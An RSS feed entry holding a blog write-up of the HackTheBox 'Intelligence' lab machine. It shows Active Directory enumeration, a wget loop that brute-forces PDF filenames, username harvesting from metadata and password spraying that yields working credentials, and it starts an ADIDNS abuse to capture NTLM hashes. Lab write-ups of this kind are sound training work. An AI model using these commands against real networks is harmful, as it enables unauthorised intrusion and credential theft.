<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Silver-Ticket on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/silver-ticket/</link>
    <description>Recent content in Silver-Ticket on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 19 Sep 2022 01:01:51 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/silver-ticket/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Intelligence</title>
      <link>https://fahmifj.github.io/hackthebox/intelligence/</link>
      <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/intelligence/</guid>
      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&amp;rsquo; metadata, a valid combination is discovered. In the file shares, there&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/"target="_blank" rel="noopener noreferrer"
>Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and  launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this  password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash, which can be cracked offline. Bloodhound analysis reveals that the user has permission to read the password of a GMSA  account, which has delegation rights to a service. These permissions can be exploited for privilege escalation to domain admin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>User enumeration via file metadata</li>
<li>ADI DNS attack</li>
<li>AD</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>BloodHound</li>
<li>dnstool.py</li>
<li>gMSADumper.py</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-14 00:22 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.248
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intelligence
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-14 11:22:29Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-14T11:23:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 104.01 seconds
</span></span></code></pre></div><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.248 dc.intelligence.htb intelligence.htb
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>When approaching an AD box, I would definitely check for anonymous login on SMB.</p>
<p>It&rsquo;s allowed but nothing to see here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.248/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can only retrieve the naming contexts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class="s2">&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The website hosted on this machine is a static site with no further information to dig in.</p>
<p><div class="img-container"><img src="imgs/image-20210714112254614.png" alt="image-20210714112254614"  /></div>
</p>
<p>In the next section, there are two download buttons.</p>
<p><div class="img-container"><img src="imgs/image-20210714112325301.png" alt="image-20210714112325301"  /></div>
</p>
<p>These buttons point to two PDF files. The file contents don&rsquo;t seem to be important, but in each document&rsquo;s properties there&rsquo;s a potential username.</p>
<p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113015135.png" alt="image-20210714113015135"  /></div>
</p>
<p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113121646.png" alt="image-20210714113121646"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-tifannymolina">Access as Tifanny.Molina</h3>
<h4 id="grabbing-more-pdfs">Grabbing more PDFs</h4>
<p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;.</p>
<p>The answer is yes, it does!</p>
<p><div class="img-container"><img src="imgs/image-20210716081606506.png" alt="image-20210716081606506"  /></div>
</p>
<p>From here, I&rsquo;ll write a script to brute-force the other PDFs with <code>YYYY-MM-DD</code> timestamp pattern.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> month in <span class="o">{</span>01..12<span class="o">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">do</span> 
</span></span><span class="line"><span class="cl">  <span class="k">for</span> day in <span class="o">{</span>01..31<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">     wget -q <span class="s2">&#34;http://10.10.10.248/documents/2020-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl"> <span class="k">done</span>
</span></span></code></pre></div><p>And here&rsquo;s what I got.</p>
<p><div class="img-container"><img src="imgs/image-20210716083456661.png" alt="image-20210716083456661"  /></div>
</p>
<p>Alternatively, I can use <code>wget</code> with brace expansion:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget -q http://10.10.10.248/documents/2020-<span class="o">{</span>01..12<span class="o">}</span>-<span class="o">{</span>01..31<span class="o">}</span>-upload.pdf
</span></span></code></pre></div><h4 id="harvest-username-via-pdf-metadata">Harvest Username via PDF Metadata</h4>
<p>It&rsquo;s possible to harvest the creator name from the metadata to make a list of usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ exiftool * <span class="p">|</span> grep -i creator <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2 <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tee ../users.list 
</span></span><span class="line"><span class="cl">Anita.Roberts
</span></span><span class="line"><span class="cl">Brian.Baker
</span></span><span class="line"><span class="cl">Brian.Morris
</span></span><span class="line"><span class="cl">Daniel.Shelton
</span></span><span class="line"><span class="cl">Danny.Matthews
</span></span><span class="line"><span class="cl">Darryl.Harris
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The first idea to come with the username list is to perform <a href="/hackthebox/forest/#asrep-roasting"target="_blank" rel="noopener noreferrer"
>AS-REP Roasting</a> attack. I&rsquo;ve tried it but no luck there.</p>
<h4 id="pdf-content-examination">PDF Content Examination</h4>
<p>I discovered two non-<em>Lorem Ipsum</em> files by manually examining the PDF contents.</p>
<p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p>
<p><div class="img-container"><img src="imgs/image-20210716090147601.png" alt="image-20210716090147601"  /></div>
</p>
<p>The second one is <code>2020-06-04-upload.pdf</code>, it contains some internal information that will be useful later.</p>
<p><div class="img-container"><img src="imgs/image-20210716084253574.png" alt="image-20210716084253574"  /></div>
</p>
<h4 id="password-spray">Password Spray</h4>
<p>From here, I can spray the password to the username list I have harvested earlier via <code>rpcclient</code>.  This attack returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ rpcspray users.list password.list 10.10.10.248 <span class="p">|</span> grep -v <span class="s1">&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> 
</span></span></code></pre></div><h4 id="smb-revisit">SMB Revisit</h4>
<p>Enumerating SMB with <code>smbmap</code> now returns a list of shares that are accessible by Tifanny.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.248 -u <span class="s1">&#39;Tiffany.Molina&#39;</span> -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        IT                                                      READ ONLY
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   READ ONLY
</span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  user.txt                           AR       <span class="m">34</span>  Thu Jul <span class="m">15</span> 08:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444029</span> blocks available
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="access-as-tedgraves">Access as Ted.Graves</h3>
<h4 id="it-share">IT share</h4>
<p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/IT -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444112</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget downdetector.ps1 
</span></span><span class="line"><span class="cl">Get file downdetector.ps1? y
</span></span><span class="line"><span class="cl">getting file <span class="se">\d</span>owndetector.ps1 of size <span class="m">1046</span> as downdetector.ps1 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.6 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p>According to the comment it is said that this script is used to check web server status.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check web server status. Scheduled to run every 5min</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&#34;web*&#34;</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-UseDefaultCredentials</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(.</span><span class="py">StatusCode</span> <span class="o">-ne</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&#34;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s1">&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="s2">&#34;name=web*&#34;</span>
</span></span><span class="line"><span class="cl">dn: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intell
</span></span><span class="line"><span class="cl"> igence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">objectClass: top
</span></span><span class="line"><span class="cl">objectClass: dnsNode
</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDns
</span></span><span class="line"><span class="cl"> Zones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">instanceType: <span class="m">4</span>
</span></span><span class="line"><span class="cl">whenCreated: 20210716071327.0Z
</span></span><span class="line"><span class="cl">whenChanged: 20210716071707.0Z
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">102869</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">102872</span>
</span></span><span class="line"><span class="cl">showInAdvancedViewOnly: TRUE
</span></span><span class="line"><span class="cl">name: weboops
</span></span><span class="line"><span class="cl">objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class="o">==</span>
</span></span><span class="line"><span class="cl">dnsRecord:: <span class="nv">CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Dns-Node,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">dSCorePropagationData: 16010101000000.0Z
</span></span><span class="line"><span class="cl">dNSTombstoned: TRUE
</span></span><span class="line"><span class="cl">dc: weboops
</span></span></code></pre></div><p>So the script basically looks for DNS records that begin with <code>web*</code>. For each discovered record, it performs an HTTP request to check if the record is active. And if the response code is not 200, the script sends an email notification to Ted Graves.</p>
<p>The key take away here is the wildcard (<code>*</code>).</p>
<h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/"target="_blank" rel="noopener noreferrer"
>this blog</a>, in Active Directory (AD), it&rsquo;s the default behavior that any authenticated user can create a new DNS record (ADIDNS). By knowing how the previous script works, it is possible to abuse this feature.</p>
<p>Here&rsquo;s the concept: I attempted to create a DNS record (subdomain) under the <code>intelligence.htb</code> that begins with &lsquo;web*&rsquo;. The purpose was to have the script encounter the record I created during its next execution. This way, it would trigger NTLM authentication as the <code>Invoke-WebRequest</code> command was used with the <code>-UseDefaultCredentials</code> flag.</p>
<p>A well-known security researcher, <a href="https://dirkjanm.io/"target="_blank" rel="noopener noreferrer"
>Dirk-jan</a>, has developed a handy tool called <code>dnstool.py</code> specifically designed for interacting with ADIDNS. This tool is included in the <code>Krbrelayx</code> repository, so I&rsquo;ll simply clone the repository onto my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;krbrelayx&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 98, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">98</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">98</span>
